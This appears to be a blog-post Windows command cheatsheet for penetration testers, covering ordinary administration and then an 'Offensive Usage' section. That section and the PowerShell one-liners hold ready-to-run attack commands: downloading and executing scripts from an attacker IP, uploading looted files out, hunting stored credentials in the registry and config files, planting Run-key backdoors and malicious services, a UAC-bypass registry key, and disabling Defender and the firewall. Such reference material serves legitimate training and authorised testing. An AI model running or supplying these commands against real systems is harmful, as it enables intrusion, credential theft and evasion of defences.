---
layout: post
title: "windows cheatsheet"
description: "A comprehensive Windows reference — navigation, file management, networking, users, processes, and offensive usage."
---

> **Disclaimer:** This cheatsheet is for authorised penetration testing and educational purposes only. Never use these techniques against systems you do not own or have explicit written permission to test.

---

## Table of Contents

- [Filesystem Hierarchy](#filesystem-hierarchy)
- [Navigation & File System](#navigation--file-system)
- [File Operations](#file-operations)
- [File Permissions & ACLs](#file-permissions--acls)
- [Users & Groups](#users--groups)
- [Processes](#processes)
- [Networking](#networking)
- [Services](#services)
- [Registry](#registry)
- [Scheduled Tasks](#scheduled-tasks)
- [Package Management](#package-management)
- [PowerShell Essentials](#powershell-essentials)
- [Offensive Usage](#offensive-usage)

---

## Filesystem Hierarchy

| Directory | Purpose |
|-----------|---------|
| `C:\` | Root of the primary drive |
| `C:\Windows` | Core OS files |
| `C:\Windows\System32` | 64-bit system binaries and DLLs — `cmd.exe`, `net.exe`, `powershell.exe` |
| `C:\Windows\SysWOW64` | 32-bit system binaries on 64-bit systems |
| `C:\Windows\Temp` | System temporary files — world-writable, good for dropping files |
| `C:\Windows\System32\drivers\etc` | `hosts`, `networks`, `services` — network config files |
| `C:\Windows\System32\config` | Registry hive files — SAM, SYSTEM, SECURITY |
| `C:\Windows\NTDS` | Active Directory database (`ntds.dit`) — DCs only |
| `C:\Users` | User profile directories |
| `C:\Users\username\Desktop` | User desktop |
| `C:\Users\username\Documents` | User documents |
| `C:\Users\username\AppData` | Hidden app data — Local, Roaming, LocalLow |
| `C:\Users\username\AppData\Roaming` | Roaming profile data — browser profiles, configs |
| `C:\Users\username\AppData\Local\Temp` | User temp files — writable, often used for staging |
| `C:\Program Files` | 64-bit installed applications |
| `C:\Program Files (x86)` | 32-bit installed applications |
| `C:\ProgramData` | Application data shared across all users — often misconfigured permissions |
| `C:\inetpub\wwwroot` | Default IIS web root |
| `C:\boot` | Bootloader files |

---

## Navigation & File System

```cmd
# CMD — basic navigation
cd                         # print working directory
cd C:\Users                # change directory
cd ..                      # go up one level
cd /                       # go to drive root
dir                        # list directory contents
dir /a                     # show hidden files
dir /s /b *.txt            # recursive search for .txt files
cls                        # clear screen
type file.txt              # print file contents
more file.txt              # paginated view
tree                       # display directory tree
tree /f                    # include files in tree
```

```powershell
# PowerShell — navigation
Get-Location               # pwd equivalent
Set-Location C:\Users      # cd equivalent
Get-ChildItem              # ls equivalent
Get-ChildItem -Force       # show hidden files
Get-ChildItem -Recurse     # recursive listing
Get-Content file.txt       # cat equivalent
Clear-Host                 # clear screen

# Aliases (PowerShell accepts these too)
pwd, cd, ls, cat, cp, mv, rm, mkdir
```

---

## File Operations

```cmd
# CMD
copy file.txt C:\Temp\                    # copy file
copy file.txt newname.txt                 # copy and rename
xcopy C:\dir C:\backup /e /i /h          # copy directory recursively
move file.txt C:\Temp\                    # move file
rename file.txt newname.txt              # rename file
del file.txt                             # delete file
del /f /q file.txt                       # force delete quietly
rmdir dir                                # delete empty directory
rmdir /s /q dir                          # delete directory recursively
mkdir newdir                             # create directory
echo text > file.txt                     # write to file (overwrite)
echo text >> file.txt                    # append to file
```

```powershell
# PowerShell
Copy-Item file.txt C:\Temp\              # copy file
Copy-Item -Recurse C:\dir C:\backup      # copy directory
Move-Item file.txt C:\Temp\              # move file
Rename-Item file.txt newname.txt         # rename
Remove-Item file.txt                     # delete file
Remove-Item -Recurse -Force dir\         # delete directory
New-Item -ItemType Directory newdir      # create directory
New-Item -ItemType File file.txt         # create empty file
Get-Content file.txt                     # read file
Set-Content file.txt "text"              # write to file
Add-Content file.txt "text"              # append to file
Select-String "password" file.txt        # grep equivalent
```

---

## File Permissions & ACLs

```cmd
# CMD
# View permissions
icacls file.txt                          # show ACL
icacls C:\dir /T                         # recursive

# Modify permissions
icacls file.txt /grant username:F        # grant full control
icacls file.txt /grant username:R        # grant read
icacls file.txt /grant username:W        # grant write
icacls file.txt /deny username:W         # deny write
icacls file.txt /remove username         # remove user ACE
icacls file.txt /reset                   # reset to inherited

# Permission flags
# F = Full Control
# M = Modify
# RX = Read & Execute
# R = Read
# W = Write
```

```powershell
# PowerShell ACL management
Get-Acl file.txt                                      # view ACL
Get-Acl file.txt | Format-List                        # detailed view

# Check service binary permissions — useful for privesc
Get-Acl "C:\Program Files\Service\service.exe" | Format-List

# accesschk (Sysinternals) — check permissions on services, files, registry
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv servicename /accepteula
```

---

## Users & Groups

```cmd
# CMD
# Local user management
net user                                 # list all local users
net user username                        # info about specific user
net user username password /add         # create user
net user username /delete               # delete user
net user username * /add                # create user, prompt for password
net localgroup                          # list all local groups
net localgroup administrators           # list members of admins group
net localgroup administrators username /add  # add user to admins

# Domain user management
net user /domain                        # list domain users
net user username /domain               # domain user info
net group /domain                       # list domain groups
net group "Domain Admins" /domain       # list Domain Admins
```

```powershell
# PowerShell user management
Get-LocalUser                            # list local users
Get-LocalUser -Name username            # specific user info
New-LocalUser -Name username -Password (ConvertTo-SecureString "Pass123!" -AsPlainText -Force)
Remove-LocalUser -Name username
Get-LocalGroup                           # list local groups
Get-LocalGroupMember -Group "Administrators"  # list admins
Add-LocalGroupMember -Group "Administrators" -Member username

# Current user info
whoami
whoami /priv                            # privileges
whoami /groups                          # group memberships
whoami /all                             # everything
```

---

## Processes

```cmd
# CMD
tasklist                                 # list running processes
tasklist /fi "imagename eq chrome.exe"  # filter by name
tasklist /svc                            # show services per process
taskkill /pid 1234                       # kill by PID
taskkill /im chrome.exe                  # kill by name
taskkill /f /im chrome.exe              # force kill
```

```powershell
# PowerShell
Get-Process                              # list processes
Get-Process -Name chrome                 # filter by name
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10  # top CPU
Stop-Process -Id 1234                    # kill by PID
Stop-Process -Name chrome                # kill by name
Stop-Process -Name chrome -Force         # force kill

# Process details
Get-Process -Name svchost | Select-Object *
Get-WmiObject Win32_Process | Select-Object Name,ProcessId,CommandLine
```

---

## Networking

```cmd
# CMD
# Interface info
ipconfig                                 # basic interface info
ipconfig /all                            # detailed — MAC, DNS, DHCP
ipconfig /flushdns                       # flush DNS cache
ipconfig /displaydns                     # show DNS cache

# Connectivity
ping 8.8.8.8                             # ping
ping -n 4 8.8.8.8                        # ping 4 times
tracert 8.8.8.8                          # traceroute
nslookup target.com                      # DNS lookup
nslookup target.com 8.8.8.8             # DNS lookup via specific server

# Connections & ports
netstat -ano                             # all connections with PIDs
netstat -ano | findstr :80               # filter by port
netstat -ano | findstr LISTENING         # listening ports only
arp -a                                   # ARP cache

# Firewall
netsh advfirewall show allprofiles       # firewall status
netsh advfirewall firewall show rule name=all  # list all rules
netsh advfirewall set allprofiles state off    # disable firewall (requires admin)
netsh advfirewall firewall add rule name="Allow 4444" protocol=TCP dir=in localport=4444 action=allow

# Port forwarding
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=192.168.1.10
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0
```

```powershell
# PowerShell networking
Get-NetIPAddress                         # IP addresses
Get-NetRoute                             # routing table
Get-NetTCPConnection                     # TCP connections
Get-NetTCPConnection -State Listen       # listening ports
Get-NetTCPConnection -LocalPort 80       # filter by port
Resolve-DnsName target.com              # DNS lookup
Test-NetConnection -ComputerName target.com -Port 80  # test port connectivity
Test-Connection 8.8.8.8                  # ping equivalent
```

---

## Services

```cmd
# CMD
sc query                                 # list all services
sc query servicename                     # query specific service
sc start servicename                     # start service
sc stop servicename                      # stop service
sc config servicename start= auto        # set service to auto start
sc config servicename binpath= "C:\evil.exe"  # change service binary (privesc)
sc create servicename binpath= "C:\evil.exe" start= auto  # create service
sc delete servicename                    # delete service

net start                                # list running services
net start servicename                    # start service
net stop servicename                     # stop service
```

```powershell
# PowerShell
Get-Service                              # list all services
Get-Service -Name servicename           # specific service
Start-Service -Name servicename         # start
Stop-Service -Name servicename          # stop
Restart-Service -Name servicename       # restart
Set-Service -Name servicename -StartupType Automatic  # set startup type

# Service details — useful for privesc enum
Get-WmiObject Win32_Service | Select-Object Name,State,PathName,StartName
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "C:\Windows*"} | Select-Object Name,PathName
```

---

## Registry

```cmd
# CMD
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  # startup entries
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  # user startup
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon creds
reg query HKLM /f password /t REG_SZ /s  # search for password values
reg query HKCU /f password /t REG_SZ /s

# Add / modify
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd.exe" /f
reg add "HKCU\...\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe" /f

# Delete
reg delete "HKCU\...\Run" /v backdoor /f

# Export / import
reg export HKLM\SOFTWARE\target backup.reg
reg import backup.reg
```

```powershell
# PowerShell registry
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\servicename"
Set-ItemProperty -Path "HKCU:\...\Run" -Name "backdoor" -Value "C:\backdoor.exe"
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Remove-ItemProperty -Path "HKCU:\...\Run" -Name "backdoor"

# Common registry hives
# HKLM — Local Machine (system-wide)
# HKCU — Current User
# HKCR — Classes Root (file associations)
# HKU  — All Users
# HKCC — Current Config
```

---

## Scheduled Tasks

```cmd
# CMD
schtasks /query /fo LIST /v              # list all tasks verbosely
schtasks /query /fo LIST /v | findstr "Task Name\|Run As\|Task To Run"
schtasks /create /tn "taskname" /tr "C:\evil.exe" /sc onlogon /ru System  # create task
schtasks /run /tn "taskname"             # run task immediately
schtasks /delete /tn "taskname" /f       # delete task
```

```powershell
# PowerShell
Get-ScheduledTask                        # list all tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}  # non-Microsoft tasks
Get-ScheduledTaskInfo -TaskName "taskname"
New-ScheduledTask ...
Unregister-ScheduledTask -TaskName "taskname" -Confirm:$false
```

---

## Package Management

```powershell
# Winget — Windows Package Manager (Windows 10+)
winget search firefox                    # search for package
winget install Mozilla.Firefox           # install package
winget upgrade --all                     # upgrade all packages
winget list                              # list installed packages
winget uninstall Mozilla.Firefox         # uninstall

# Chocolatey
choco install nmap                       # install package
choco upgrade all                        # upgrade all
choco list --local-only                  # list installed

# List installed software
Get-WmiObject Win32_Product | Select-Object Name,Version
wmic product get name,version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion
```

---

## PowerShell Essentials

```powershell
# Execution policy
Get-ExecutionPolicy                      # check current policy
Set-ExecutionPolicy Bypass -Scope Process -Force  # bypass for current session
powershell -ExecutionPolicy Bypass -File script.ps1  # bypass on launch

# Help system
Get-Help Get-Process                     # help for cmdlet
Get-Help Get-Process -Examples           # show examples
Get-Command *service*                    # find commands matching pattern
Get-Member                               # show properties and methods of object

# Pipeline & filtering
Get-Process | Where-Object {$_.CPU -gt 10}           # filter
Get-Process | Select-Object Name,CPU,Id              # select properties
Get-Process | Sort-Object CPU -Descending            # sort
Get-Process | Select-Object -First 5                 # first 5
Get-Service | Where-Object {$_.Status -eq "Running"} # running services

# Output formatting
Get-Process | Format-Table                           # table format
Get-Process | Format-List                            # list format
Get-Process | Out-File processes.txt                 # output to file
Get-Process | Export-Csv processes.csv               # export to CSV
Get-Process | ConvertTo-Json                         # convert to JSON

# Useful one-liners
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\Temp\file.exe')
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')  # download and execute
Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\Temp\file.exe
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.exe"))  # base64 encode file
```

---

## Offensive Usage

### Situational Awareness

```cmd
# CMD
# Quick overview
whoami /all                              # user, groups, privileges
systeminfo                               # OS, patches, architecture, domain
hostname
net user %username%                      # current user details
net localgroup administrators            # who has admin?

# Domain context
echo %userdomain%                        # domain name
echo %logonserver%                       # domain controller
net user /domain                         # domain users
net group "Domain Admins" /domain        # domain admins
nltest /dclist:domain.local              # list domain controllers
```

```powershell
# PowerShell situational awareness
$env:COMPUTERNAME                        # hostname
$env:USERDOMAIN                          # domain
$env:USERNAME                            # current user
[System.Environment]::OSVersion         # OS version
(Get-WmiObject Win32_ComputerSystem).Domain  # domain name

# Installed patches — identify missing patches
Get-HotFix | Sort-Object InstalledOn -Descending
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Interesting environment variables
Get-ChildItem Env:                       # all env vars — look for creds, paths
$env:PATH                                # PATH — hijacking opportunities
```

### Credential Hunting

```powershell
# Search filesystem for credentials
Get-ChildItem -Recurse -ErrorAction SilentlyContinue C:\Users | Where-Object {$_.Name -match "pass|cred|secret|key"}
Get-ChildItem -Recurse -ErrorAction SilentlyContinue C:\inetpub | Where-Object {$_.Extension -match "\.config|\.xml|\.ini"}

# Search file contents
Select-String -Path C:\inetpub\*.config -Pattern "password" -CaseSensitive:$false
Select-String -Path C:\Users\*\*.txt -Pattern "password" -CaseSensitive:$false -ErrorAction SilentlyContinue

# Common credential locations
type C:\Windows\System32\drivers\etc\hosts          # internal hostnames
type C:\inetpub\wwwroot\web.config                  # IIS app credentials
type C:\xampp\htdocs\config.php                     # XAMPP PHP credentials
type "C:\Program Files\FileZilla Server\FileZilla Server.xml"  # FTP creds

# Unattended install files — often contain plaintext credentials
dir /s /b C:\unattend.xml C:\sysprep.inf C:\sysprep.xml 2>nul
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml

# Registry credential hunting
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s                 # PuTTY creds
reg query "HKCU\Software\ORL\WinVNC3\Password"                          # VNC creds

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Saved credentials
cmdkey /list                             # saved Windows credentials
```

### Privilege Escalation Enumeration

```powershell
# Check privileges — look for SeImpersonatePrivilege, SeDebugPrivilege etc.
whoami /priv

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# Weak service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Everyone" * /accepteula 2>nul

# AlwaysInstallElevated — MSI runs as SYSTEM if both keys = 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Writable directories in PATH — DLL hijacking
foreach ($path in $env:PATH.Split(";")) {
  $acl = Get-Acl $path -ErrorAction SilentlyContinue
  if ($acl) { Write-Host "$path : $($acl.AccessToString)" }
}

# Missing patches
Get-HotFix | Select-Object HotFixID,InstalledOn | Sort-Object InstalledOn

# Running as SYSTEM processes — potential injection targets
Get-WmiObject Win32_Process | Where-Object {$_.GetOwner().User -eq "SYSTEM"} | Select-Object Name,ProcessId
```

### File Transfer

```powershell
# Download methods
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\Temp\file.exe')
Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\Temp\file.exe
curl http://10.10.14.5/file.exe -o C:\Temp\file.exe   # curl alias in PS 7+

# certutil — built-in, often not blocked
certutil -urlcache -split -f http://10.10.14.5/file.exe C:\Temp\file.exe

# bitsadmin — background transfer service
bitsadmin /transfer job /download /priority normal http://10.10.14.5/file.exe C:\Temp\file.exe

# SMB — copy from attacker share
copy \\10.10.14.5\share\file.exe C:\Temp\
net use \\10.10.14.5\share /user:attacker password

# Base64 encode and transfer
# On attacker — encode file
base64 -w 0 file.exe > file.b64
# On target — decode
$b64 = Get-Content C:\Temp\file.b64
[System.IO.File]::WriteAllBytes("C:\Temp\file.exe", [System.Convert]::FromBase64String($b64))

# Upload from target to attacker
# Start upload server on attacker: python3 -m uploadserver
Invoke-WebRequest -Uri http://10.10.14.5:8000/upload -Method POST -InFile C:\loot\file.txt
```

### Useful One-Liners

```powershell
# Find all local admin accounts
Get-LocalGroupMember -Group "Administrators"

# List all non-standard services (potential privesc targets)
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "*system32*" -and $_.PathName -notlike "*Program Files*"} | Select-Object Name,PathName,StartName

# Find world-writable directories
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSIsContainer -and ((Get-Acl $_.FullName).AccessToString -match "Everyone.*Allow.*Write")}

# Active network connections with process names
Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,@{n="Process";e={(Get-Process -Id $_.OwningProcess).Name}}

# Disable Windows Defender (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Add exclusion path to Defender
Add-MpPreference -ExclusionPath "C:\Temp"

# Find files modified in last 24 hours
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-24)}

# Internal port scan without tools
1..1024 | ForEach-Object { $port = $_; try { $conn = New-Object System.Net.Sockets.TcpClient("192.168.1.1",$port); "$port open"; $conn.Close() } catch {} }
```
